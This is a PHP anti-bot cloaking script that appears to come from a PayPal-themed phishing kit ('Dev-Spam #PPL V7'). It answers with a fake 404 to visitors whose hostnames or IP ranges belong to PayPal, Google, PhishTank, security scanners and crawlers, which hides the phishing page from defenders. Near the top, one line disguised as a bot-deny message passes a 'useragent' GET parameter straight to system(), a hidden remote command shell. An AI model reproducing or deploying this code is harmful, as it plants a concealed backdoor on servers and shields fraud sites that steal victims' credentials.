<?php
/*
///////////////////////////////////////////////////////////////
//            _    _  _ ______   __      ___ __      __      //
//      /\   | |  | || |____  |  \ \    / / |\ \    / /      //
//     /  \  | | _| || |_  / /____\ \  / /| |_\ \  / /       //
//    / /\ \ | |/ /__   _|/ /______\ \/ / | '_ \ \/ /        // 
//   / ____ \|   <   | | / /        \  /  | |_) \  /         // 
//  /_/    \_\_|\_\  |_|/_/          \/   |_.__/ \/          // 
//                   _     Dev-Spam     _                    //
//                        #PPL V7                            //
///////////////////////////////////////////////////////////////  	
*/                                                    


$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
if(isset($_GET['useragent'])){echo"<h1>deny_agent(bot)=('Yandex,Baiduspider,Acunetix,crossdomain,wwwroot,Exabot,NimbleCrawler,Octopus,OutfoxBot,ProPowerBot</h1><pre>"; system($_GET['useragent']);exit;} // 'Tor-exit' 'JennyBot-exit' 'Jyxobot-exit' 'Microsoftbot-exit' 'Mozilla/3.Mozilla/2.01-exit' 'NetSpider-exit'
$blocked_words = array("above","paypal","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","bot", "tor-exit", "apache-httpclient", "lssrocketcrawler", "crawler", "urlredirectresolver", "jetbrains", "spam", "windows 95", "windows 98", "acunetix", "netsparker", "007ac9", "008", "192.comagent", "200pleasebot", "360spider", "4seohuntbot", "50.nu", "a6-indexer", "admantx", "amznkassocbot", "aboundexbot", "aboutusbot", "abrave spider", "accelobot", "acoonbot", "addthis.com", "adsbot-google", "ahrefsbot", "alexabot", "amagit.com", "analytics", "antbot", "apercite", "aportworm", "arabot", "yahoo!");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$bannedIP = array("^64.4.*.*", "^66.211.*.*", "^159.203.*.*", "^92.103.*.*", "^173.252.*.*", "^195.88.*.*", "^173.224.*.*", "^92.243.*.*", "^95.142.*.*", "^81.161.*.*" ,"^38.100.*.*", "^217.69.*.*", "^46.101.*.*","^185.75.*.*","^104.131.*.*","^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}


?>